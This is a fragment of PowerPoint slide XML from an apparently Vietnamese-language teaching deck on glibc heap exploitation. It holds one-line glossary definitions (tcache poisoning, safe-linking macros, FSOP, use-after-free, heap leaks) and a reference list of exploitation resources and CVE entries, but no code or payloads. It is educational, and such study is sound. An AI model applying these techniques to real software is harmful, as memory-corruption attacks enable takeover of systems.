          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3258312"/>
            <a:ext cx="2281428" cy="4114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PROTECT_PTR / REVEAL_PTR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3715512"/>
            <a:ext cx="2281428" cy="716280"/>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Macro mã hoá / giải mã con trỏ của safe-linking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="3093720"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="3258312"/>
            <a:ext cx="2281428" cy="4114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heap leak</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="3715512"/>
            <a:ext cx="2281428" cy="716280"/>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Rò rỉ địa chỉ heap/libc qua đọc/in dữ liệu chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4770120"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4934712"/>
            <a:ext cx="2281428" cy="4114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tcache poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5391912"/>
            <a:ext cx="2281428" cy="716280"/>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Ghi đè next trong chunk đã free để điều hướng malloc()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="4770120"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="4934712"/>
            <a:ext cx="2281428" cy="4114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arbitrary allocation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="5391912"/>
            <a:ext cx="2281428" cy="716280"/>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Khiến malloc() trả về chunk tại địa chỉ tuỳ ý</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4770120"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4934712"/>
            <a:ext cx="2281428" cy="4114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FSOP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5391912"/>
            <a:ext cx="2281428" cy="716280"/>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Lợi dụng cấu trúc FILE/_IO_* để chiếm luồng thực thi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="4770120"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="4934712"/>
            <a:ext cx="2281428" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>use-after-free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="5391912"/>
            <a:ext cx="2281428" cy="716280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng con trỏ sau khi vùng nhớ đã bị free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="566928"/>
            <a:ext cx="11274552" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tài liệu tham khảo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="274320"/>
            <a:ext cx="11274552" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NGUỒN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1600200"/>
            <a:ext cx="5157216" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId1" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Malware for Beginners, phần 1 (blog cá nhân)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="13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HackTricks: Double free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HackTricks: Bins &amp; memory allocations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HackTricks: Tcache bin attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>OWASP: Doubly freeing memory</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>GeeksforGeeks: Memory Management in OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId7" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>how2heap (shellphish)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId8" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>glibc Wiki: MallocInternals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId9" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Check Point Research: Safe-Linking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId10" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>corgi.rip: The House of Water</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId11" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>MITRE CWE-415: Double Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1600200"/>
            <a:ext cx="5157216" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId12" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>MITRE CWE-416: Use After Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId13" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>NVD: CVE-2026-33824</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId14" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>NVD: CVE-2026-23918</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId15" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>NVD: CVE-2025-62215</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId16" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Microsoft MSRC: CVE-2026-33824</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
